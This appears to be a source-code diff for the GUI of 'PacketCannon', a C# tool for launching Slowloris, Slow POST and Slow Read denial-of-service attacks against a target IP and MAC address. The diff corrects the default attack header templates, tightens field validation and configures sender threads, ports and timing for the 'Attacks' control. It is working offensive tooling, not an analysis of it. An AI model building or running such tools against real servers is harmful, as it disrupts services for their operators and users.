@@ -124,7 +124,7 @@ namespace PacketCannon
 
         private void ResetAllAdditionalSettingsFields()
         {
-            SlowLorisHeaderTextBox.Text = $"GET /? 654865241562456 HTTP / 1.1\r\nHost: {HostAddress.Text} \r\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42";
+            SlowLorisHeaderTextBox.Text = $"GET /?654865241562456 HTTP/1.1\r\nHost: {HostAddress.Text} \r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n";
 
             SlowLorisKeepAliveDataTextBox.Text = "X-a: b";
 
@@ -132,9 +132,9 @@ namespace PacketCannon
 
             SlowReadWindowSizeTextBox.Text = "10";
 
-            SlowPostHeaderTextBox.Text = "1000000";
+            SlowPostContentLengthTextBox.Text = "1000000";
 
-            SlowPostContentLengthTextBox.Text = $"POST /textform.php HTTP/1.1\r\nHost: {HostAddress.Text}  \r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n";
+            SlowPostHeaderTextBox.Text = $"POST /textform.php HTTP/1.1\r\nHost: {HostAddress.Text}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)";
 
             StartPortTextBox.Text = "5000";
 
@@ -165,27 +165,6 @@ namespace PacketCannon
             SlowPostContentLengthLabel.Visibility = visibility;
         }
 
-        //private void CheckBox_Click(object sender, RoutedEventArgs e)
-        //{
-        //    HideAllAdditionalSettingsTextAndCheckBoxes(Visibility.Visible);
-        //
-        //    // else HideAllAdditionalSettingsTextAndCheckBoxes(Visibility.Hidden);
-        //}
-        //
-        //private void DisableAllTextBoxes()
-        //{
-        //    SlowReadWindowSizeTextBox.IsEnabled = false;
-        //    SlowLorisHeaderTextBox.IsEnabled = false;
-        //    SlowPostHeaderTextBox.IsEnabled = false;
-        //    SenderCountTextBox.IsEnabled = false;
-        //    SendersTimeBetweenTextBox.IsEnabled = false;
-        //    SendersWaveTimeTextBox.IsEnabled = false;
-        //    StartPortTextBox.IsEnabled = false;
-        //    PortStepTextBox.IsEnabled = false;
-        //    SlowLorisKeepAliveDataTextBox.IsEnabled = false;
-        //    SlowReadUrlTextBox.IsEnabled = false;
-        //}
-
         private void OnlyNumbers(object sender, System.Windows.Input.TextCompositionEventArgs e)
         {
             e.Handled = Regex.IsMatch(e.Text, @"[^0-9]");
@@ -202,27 +181,14 @@ namespace PacketCannon
             SelectInterfaceButton.IsEnabled = false;
             if (CheckAllRequiredFields())
             {
-                //      MessageBox.Show(
-                //          Setup.SourceIpv4 +
-                //                      "\n" + Setup.DestinationIpV4 +
-                //                      "\n" + Setup.Communicator +
-                //                      "\n" + Setup.senderSize +
-                //                      "\n" + Setup.Terminate +
-                //                      "\n" + Setup.hostAddress +
-                //                      "\n" + Setup.senderTimeOut +
-                //                      "\n" + Setup.senderWaveTimeOut +
-                //                      "\n" + Setup.SourcePort +
-                //                      "\n" + Setup.portStep +
-                //                      "\n" + Setup.SourceMac +
-                //                      "\n" + Setup.DestinationMac +
-                //                      "\n" + Setup.SlowPostContentLength +
-                //                      "\n" + Setup.SlowLorisKeepAliveData +
-                //                      "\n" + Setup.SlowLorisHeader +
-                //                      "\n" + Setup.SlowPostHeader +
-                //                      "\n" + Setup.SlowReadUrl
-                //  , "DOS", MessageBoxButton.OK, MessageBoxImage.Information);
                 _senders = new Thread(Setup.StartSenders);
                 _senders.Start();
+            }
+            else
+            {
+                Attacks.IsEnabled = true;
+                GetMackAddressButton.IsEnabled = true;
+                SelectInterfaceButton.IsEnabled = true;
             }
         }
 
@@ -236,10 +202,11 @@ namespace PacketCannon
 
         private bool CheckAllRequiredFields()
         {
-            if (TargetIpAddress.Text.Equals("") || HostIpAddress.Text.Equals("") || TargetMacAddress.Text.Equals("") ||
-                HostAddress.Text.Equals("")) return false;
             try
             {
+                if (TargetIpAddress.Text.Equals("") || HostIpAddress.Text.Equals("") || TargetMacAddress.Text.Equals("") ||
+                    HostAddress.Text.Equals("")) throw new ArgumentException();
+
                 Setup.DestinationIpV4 = TargetIpAddress.Text;
                 Setup.SourceIpv4 = HostIpAddress.Text;
                 Setup.DestinationMac = new MacAddress(TargetMacAddress.Text);
@@ -321,61 +288,20 @@ namespace PacketCannon
                     }
                     break;
             }
-
-            // Setup.SlowPostContentLength =
-            //     SlowReadWindowSizeTextBox.IsEnabled && SlowReadWindowSizeTextBox.Text != ""
-            //         ? Convert.ToInt32(SlowReadWindowSizeTextBox.Text)
-            //         : 1000000;
-            //
-            // Setup.SlowLorisHeader = SlowLorisHeaderTextBox.IsEnabled && SlowLorisHeaderTextBox.Text != ""
-            //     ? SlowLorisHeaderTextBox.Text
-            //     : null;
-            //
-            // Setup.SlowPostHeader = SlowPostHeaderTextBox.IsEnabled && SlowPostHeaderTextBox.Text != ""
-            //     ? SlowPostHeaderTextBox.Text
-            //     : null;
-
             if (SenderCountTextBox.Text.Equals("") || SendersTimeBetweenTextBox.Text.Equals("") ||
                 SendersWaveTimeTextBox.Text.Equals("") || StartPortTextBox.Text.Equals("") ||
-                PortStepTextBox.Text.Equals(""))
+                PortStepTextBox.Text.Equals("") || Convert.ToInt32(StartPortTextBox.Text) < 1000)
             {
-                throw new ArgumentException("Additional settings about senders should not be empty");
+                throw new ArgumentException("Additional settings about senders should not be invalid or empty empty");
             }
-
-            // if (SenderCountTextBox.IsEnabled && SenderCountTextBox.Text != "")
-            //{
-            //    Setup.SenderSize = Convert.ToInt32(SenderCountTextBox.Text);
-            //}
-            //
-            //if (SendersTimeBetweenTextBox.IsEnabled && SendersTimeBetweenTextBox.Text != "")
-            //{
-            //    Setup.SenderTimeOut = Convert.ToInt32(SendersTimeBetweenTextBox.Text);
-            //}
-            //
-            //if (SendersWaveTimeTextBox.IsEnabled && SendersWaveTimeTextBox.Text != "")
-            //{
-            //    Setup.SenderWaveTimeOut = Convert.ToInt32(SendersWaveTimeTextBox.Text);
-            //}
-            //
-            //if (StartPortTextBox.IsEnabled && StartPortTextBox.Text != "")
-            //{
-            //    Setup.SourcePort = Convert.ToInt32(StartPortTextBox.Text);
-            //}
-            //
-            //if (PortStepTextBox.IsEnabled && PortStepTextBox.Text != "")
-            //{
-            //    Setup.PortStep = Convert.ToInt32(PortStepTextBox.Text);
-            //}
-            //
-            //if (SlowLorisKeepAliveDataTextBox.IsEnabled && SlowLorisKeepAliveDataTextBox.Text != "")
-            //{
-            //    Setup.SlowLorisKeepAliveData = SlowLorisKeepAliveDataTextBox.Text;
-            //}
-            //
-            //if (SlowReadUrlTextBox.IsEnabled && SlowReadUrlTextBox.Text != "")
-            //{
-            //    Setup.SlowReadUrl = SlowReadUrlTextBox.Text;
-            //}
+            else
+            {
+                Setup.SenderSize = Convert.ToInt32(SenderCountTextBox.Text);
+                Setup.SenderTimeOut = Convert.ToInt32(SendersTimeBetweenTextBox.Text);
+                Setup.SenderWaveTimeOut = Convert.ToInt32(SendersWaveTimeTextBox.Text);
+                Setup.SourcePort = Convert.ToInt32(StartPortTextBox.Text);
+                Setup.PortStep = Convert.ToInt32(PortStepTextBox.Text);
+            }
         }
 
         protected override void OnClosed(EventArgs e)
